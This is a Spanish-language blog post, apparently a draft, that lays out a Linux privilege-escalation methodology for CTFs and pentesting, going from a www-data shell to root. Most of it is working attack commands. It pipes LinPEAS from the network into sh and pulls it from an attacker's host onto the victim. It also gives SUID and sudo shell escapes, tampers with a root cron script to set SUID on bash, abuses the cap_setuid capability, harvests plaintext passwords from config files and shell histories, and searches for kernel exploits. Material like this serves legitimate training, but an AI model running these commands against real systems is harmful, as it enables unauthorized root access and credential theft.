---
title: "Linux Privilege Escalation: de www-data a root"
description: "Metodología completa de escalada de privilegios en Linux — vectores comunes, herramientas y técnicas usadas en CTFs y pentesting real."
pubDate: 2024-03-05
tags: ["linux", "ctf", "exploit"]
author: "Jafet Brito"
heroImage: "https://picsum.photos/seed/linux-terminal-root/1200/630"
lang: "es"
draft: true
---

## El objetivo

Tienes una shell como usuario de bajos privilegios (`www-data`, `apache`, `daemon`...). El objetivo es llegar a `root`. Este post documenta los vectores que reviso sistemáticamente.

```bash
# Primero: saber dónde estás
id && whoami && hostname
cat /etc/passwd | grep -v nologin
```

## Metodología: enumeración primero

Antes de explotar nada, enumerar todo. Uso **LinPEAS** para automatizar:

```bash
# Descargar y ejecutar LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# O transferir desde tu máquina
python3 -m http.server 8000
# En víctima:
wget http://TU-IP:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

## Vector 1: SUID binaries

Busca ejecutables con el bit SUID activado. Si root los creó y tienen vulnerabilidades, eres root.

```bash
find / -perm -u=s -type f 2>/dev/null
```

Comprueba en [GTFOBins](https://gtfobins.github.io/) si alguno es explotable:

```bash
# Ejemplo: /usr/bin/find con SUID
find . -exec /bin/sh -p \; -quit
# → shell como root

# Ejemplo: /usr/bin/vim con SUID
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

## Vector 2: sudo -l

```bash
sudo -l
# Si ves: (ALL) NOPASSWD: /usr/bin/python3
```

```python
# Escalada inmediata
sudo python3 -c 'import os; os.system("/bin/bash")'
```

## Vector 3: Cron jobs

```bash
# Ver cron jobs del sistema
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Monitorear procesos nuevos (ver scripts que ejecuta root)
watch -n 1 'ps aux | grep root'

# O usar pspy
./pspy64 -pf -i 1000
```

Si un cron job ejecuta un script que tú puedes modificar:

```bash
# /etc/crontab tiene:
# * * * * * root /opt/backup.sh

# Si puedes escribir en /opt/backup.sh:
echo 'chmod +s /bin/bash' >> /opt/backup.sh
# Esperar el minuto, luego:
/bin/bash -p
```

## Vector 4: Capabilities

```bash
getcap -r / 2>/dev/null
# Ejemplo de salida peligrosa:
# /usr/bin/python3 = cap_setuid+ep

python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

## Vector 5: Contraseñas en texto plano

```bash
# Archivos de config frecuentes
grep -r "password" /var/www/ 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
find / -name "*.conf" -o -name "*.config" -o -name ".env" 2>/dev/null | xargs grep -l "pass" 2>/dev/null

# Historia de comandos
cat ~/.bash_history
cat ~/.zsh_history

# Credenciales de bases de datos
cat /var/www/html/wp-config.php
cat /var/www/html/config/database.php
```

## Vector 6: Kernel exploits

Última opción — puede crashear el sistema.

```bash
uname -a
# Linux victim 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64

# Buscar en exploit-db o searchsploit
searchsploit linux kernel 4.4.0 privilege
# DirtyCow (CVE-2016-5195) es clásico en máquinas viejas
```

## Checklist rápida

```
[ ] sudo -l
[ ] SUID binaries (GTFOBins)
[ ] Cron jobs escribibles
[ ] Capabilities (getcap)
[ ] /etc/passwd escribible
[ ] NFS sin root_squash
[ ] Contraseñas en configs
[ ] Variables de entorno LD_PRELOAD
[ ] Kernel version exploit
[ ] Docker socket (/var/run/docker.sock)
[ ] Writable PATH directories
```

## Verificación final

```bash
# ¿Llegaste a root?
id
# uid=0(root) gid=0(root) groups=0(root)

# Leer la flag
cat /root/root.txt
```

---

En el próximo post cubriré **Windows Privilege Escalation** con una metodología equivalente. Sígueme en [Telegram](https://t.me/jafetbrito) para no perdértelo.
